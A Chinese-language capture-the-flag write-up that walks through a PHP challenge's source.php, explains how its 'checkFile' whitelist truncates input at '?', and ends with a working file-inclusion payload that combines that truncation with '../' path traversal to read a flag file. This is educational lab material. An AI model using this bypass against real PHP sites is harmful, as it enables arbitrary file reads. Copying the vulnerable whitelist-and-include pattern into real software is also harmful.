**访问靶机**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251020163225299.png)

**查看网页源码**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251020163300996.png)

**访问source.php**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251020163353152.png)

**访问hint.php,提示flag为ffffllllaaaagggg文件**
![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251020163506759.png)

**分析source.php**
```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

---

**第一步，定义白名单，只允许值为 `"source.php"` 和 `"hint.php"`**
```php
$whitelist = ["source"=>"source.php","hint"=>"hint.php"];
```

---

**第二步，输入合法性检查**
**必须存在且为字符串，防止传入数组、null 等绕过**
```php
if (! isset($page) || !is_string($page)) {
    echo "you can't see it";
    return false;
}
```

---

**第三步，检查原始值**
```php
if (in_array($page, $whitelist)) {
    return true;
}
```
**`$page` 必须 完全等于`"source.php"` 或 `"hint.php"`**

---

**第四步， 第二重检查（截取 `?` 前的部分）**
**从 `$page` 字符串中提取出第一个 `?` 之前的部分（不含 `?`），用于后续白名单检查**
****允许用户访问 `白名单文件?任意参数`，但禁止访问非白名单文件****
```php
$_page = mb_substr(
    $page,
    0,
    mb_strpos($page . '?', '?')
);
// 从 `$page` 的 **第 0 位开始**，截取 **长度为 `mb_strpos(...)` 的子串**
// 得到 `$page` 中 **第一个 `?` 之前的内容**（如果无 `?`，则返回整个 `$page`）
/*
test("source.php");               // Input: 'source.php' → Pos: 10 → Output: 'source.php'
test("source.php?abc");           // Input: 'source.php?abc' → Pos: 10 → Output: 'source.php'
test("hint.php?../flag");         // Input: 'hint.php?../flag' → Pos: 8 → Output: 'hint.php'
test("abc");                      // Input: 'abc' → Pos: 3 → Output: 'abc'
test("source.php%3f../flag");     // Input: 'source.php%3f../flag' → Pos: 14 → Output: 'source.php%3f../flag'
test("");                         // Input: '' → Pos: 0 → Output: ''
test("?flag");                    // Input: '?flag' → Pos: 0 → Output: ''
*/
```

**然后：`if (in_array($_page, $whitelist)) return true;`，只要 `?` 前的部分是 `source.php` 或 `hint.php`，就通过**

**mb_substr() 函数：返回字符串的一部分**
```php
<?php
echo mb_substr("菜鸟教程", 0, 2);
// 输出：菜鸟
?>
```
---

**第五步， ## 第三重检查（urldecode 后再截取），用于防御 URL 编码绕过攻击**
****对用户输入进行 URL 解码，然后提取 `?` 之前的真实路径，检查是否为白名单文件，从而防止通过 URL 编码（如 `%3f`）绕过文件包含限制****
```php
$_page = urldecode($page); // 对 `$page` 进行 **URL 解码（URL decoding）**，将 `%xx` 形式的编码还原为原始字符
$_page = mb_substr( // 从 **解码后的字符串** 中提取第一个 `?` 之前的部分（即“真实路径”）
    $_page,
    0,
    mb_strpos($_page . '?', '?')
);
if (in_array($_page, $whitelist)) {
    return true;
}
```

**经过多次尝试，得到如下：**
```php
/source.php?file=hint.php?./../../../../../ffffllllaaaagggg
```

![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20251020171249250.png)
